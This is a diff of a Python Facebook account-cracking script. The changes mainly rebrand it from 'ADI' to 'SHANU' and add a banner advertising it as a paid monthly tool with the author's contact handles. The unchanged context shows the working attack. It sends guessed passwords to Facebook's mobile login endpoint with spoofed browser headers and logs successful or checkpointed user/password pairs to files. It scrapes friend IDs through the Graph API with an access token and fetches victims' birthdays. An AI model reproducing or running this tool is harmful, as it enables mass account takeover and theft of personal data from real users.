@@ -221,13 +221,13 @@ class __crack__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mADI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mSHANU-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('ok.txt','a').write('%s\n' % wrt)
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
-				print('\r\033[1;31m[\033[1;30mADI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
+				print('\r\033[1;31m[\033[1;30mSHANU-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('cp.txt','a').write('%s\n' % wrt)
@@ -377,7 +377,7 @@ class __filecrack3__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mADI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mSHANU-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('ADI_Ok.txt','a').write('%s\n' % wrt)
@@ -387,7 +387,7 @@ class __filecrack3__:
 					token = bayn('token.txt').read()
 					cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month].print('\r\033[1;91m[ADI-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					month = bulan_ttl[month].print('\r\033[1;91m[SHANU-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
 					open('ADI_Cp.txt','a').write('%s\n' % wrt)
@@ -398,7 +398,7 @@ class __filecrack3__:
 					year  = ''
 				except:
 					pass
-				print('\r\033[1;91m[ADI-CP] %s | %s%s      ' % (user,pw,tahun(user)))
+				print('\r\033[1;91m[SHANU-CP] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
 				open('ADI_Cp.txt','a').write('%s\n' % wrt)
@@ -529,7 +529,7 @@ def publiccrack():
         login()
     os.system('clear')
     print(banner)
-    os.system('rm -rf .adi1.txt')
+    os.system('rm -rf .Shanu.txt')
     os.system('rm -rf .adi2.txt')
     print(' \033[1;96mLogged user : \033[1;92m  '+uname)
     print(50*"\033[1;97m_")
@@ -594,13 +594,13 @@ class __cracking__:
 			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
 			if 'c_user' in ses.cookies.get_dict():
-				print('\r\033[1;37m[\033[1;32mADI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
+				print('\r\033[1;37m[\033[1;32mSHANU-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('ok.txt','a').write('%s\n' % wrt)
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
-				print('\r\033[1;31m[\033[1;30mADI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
+				print('\r\033[1;31m[\033[1;30mSHANU-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('cp.txt','a').write('%s\n' % wrt)
@@ -639,7 +639,7 @@ class __cracking__:
 		
 def create_file():
     os.system('clear');print(banner)
-    os.system('rm -rf adi1.txt')
+    os.system('rm -rf Shanu.txt')
     try:
         access_token = open('access_token.txt', 'r').read()
     except:
@@ -652,7 +652,7 @@ def create_file():
         login()
     os.system('clear')
     print(banner)
-    os.system('rm -rf .adi1.txt')
+    os.system('rm -rf .Shanu.txt')
     os.system('rm -rf .adi2.txt')
     print(' \033[1;96mLogged user : \033[1;92m  '+uname)
     print(50*"\033[1;97m_")
@@ -669,7 +669,7 @@ def create_file():
             tfile = open('access_token.txt','r').read()
             fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&access_token='+tfile).text
             qfr = json.loads(fr)
-            temp_save = open('.adi1.txt', 'a')
+            temp_save = open('.Shanu.txt', 'a')
             for data in qfr['data']:
                 uids = data['id']
                 if uids in nusrat:
@@ -697,7 +697,7 @@ def create_file():
     for links in range(ask_link):
         completed +=1
         li = ('1')
-        os.system('cat .adi1.txt | grep '+li+' >> .adi2.txt')
+        os.system('cat .Shanu.txt | grep '+li+' >> .adi2.txt')
         
     save_file = input('\033[1;37m[+]\033[1;33m EXAMPLE \033[1;31m: \033[1;36m/sdcard/filename.txt\n\033[1;37m[+]\033[1;36m SAVE FILE AS \033[1;31m: \033[1;32m')
     os.system('clear')
@@ -731,16 +731,16 @@ def create_file():
            
             if 'invalid' in str(rg):
                 print('  Token has expired, try again ...')
-                os.system('rm -rf .adi1.txt')
+                os.system('rm -rf .Shanu.txt')
                 pass
             else:
                 print('\033[1;91mField Error Something Wrong\033[0m')
                 print(54*"_")
-                os.system('rm -rf .adi1.txt')
+                os.system('rm -rf .Shanu.txt')
                 pass
     lenid = open(save_file, 'r').readlines()
     print('\033[1;37m[+]\033[1;36m PROCESS COMPLETED  ')
-    os.system('rm -rf .adi1.txt')
+    os.system('rm -rf .Shanu.txt')
     print('\033[1;37m[+] \033[1;36mTOTAL IDS  \033[1;31m: \033[1;32m'+str(len(lenid)))
     print('\033[1;37m[+] \033[1;36mFILE SAVED AS \033[1;31m: \033[1;32m'+save_file)
     input('\033[1;37m[+] \033[1;36mPRESS ENTER TO BACK ')
@@ -760,19 +760,19 @@ class load:
             time.sleep(0.1)
         print('\n')
 banner = """
-  \033[1;32m .d8888. db   db  .d8b.  d8b   db db    db
-  \033[1;37m88'  YP 88   88 d8' `8b 888o  88 88    88
-  \033[1;32m| `8bo.   88ooo88 88ooo88 88V8o 88 88    88 
-  \033[1;37m| `Y8b. 88~~~88 88~~~88 88 V8o88 88    88
-  \033[1;32m| db   8D 88   88 88   88 88  V888 88b  d88
-  \033[1;37m|    `8888Y' YP   YP YP   YP VP   V8P ~Y8888P' 
+  \033[1;32m ███████╗██╗      ██╗  █████╗     ███╗      ██╗ ██╗   ██╗
+  \033[1;37m ██╔════╝██║     ██ ║ ██╔══██╗████╗    ██║ ██║   ██║
+  \033[1;32m| ███████╗███████║ ███████║██╔██╗  ██║██║   ██║
+  \033[1;37m| ╚════██║██╔══██║ ██╔══██║██║╚██╗██║██║   ██║
+  \033[1;32m| ███████║██║      ██║ ██║     ██║██║ ╚████║╚██████╔╝
+  \033[1;37m| ╚══════╝╚═╝      ╚═╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
 \033[1;32m┌────────────────────────────────────────────────┐
 \033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m THE SHANU       │\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
 \033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m Soldierspd   │\033[1;37m• \033[1;36mPER MONTH PACKAGE \033[1;37m• \033[1;32m│
 \033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +92300037621│\033[1;32m──────────────────────\033[1;32m│
 \033[1;32m│\033[1;31m➣\033[1;37m YOUTUBE \033[1;31m:\033[1;32m TheShaNuxD │\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36m300RS \033[1;37m•   \033[1;32m│
 \033[1;32m└────────────────────────────────────────────────┘
-\033[1;32m│         \033[1;37m• 🇹​​​​​🇭​​​​​🇮​​​​​🇸​​​​​ 🇹​​​​​🇴​​​​​🇴​​​​​🇱​​​​​ 🇨​​​​​🇷​​​​​🇪​​​​​🇦​​​​​🇹​​​​​🇪​​​​​🇩​​​​​ 🇧​​​​​🇾​​​​​ ​🇸​🇭​🇦​🇳​🇺​ \033[1;37m•      \033[1;32m │
+\033[1;32m│         \033[1;37m• 🇹​​​​​🇴​​​​​🇴​​​​​🇱​​​​​ 🇨​​​​​🇷​​​​​🇪​​​​​🇦​​​​​🇹​​​​​🇪​​​​​🇩​​​​​ 🇧​​​​​🇾​​​​​ ​🇸​🇭​🇦​🇳​🇺​ \033[1;37m•      \033[1;32m │
 \033[1;32m└────────────────────────────────────────────────┘
 """
 ct = datetime.now()
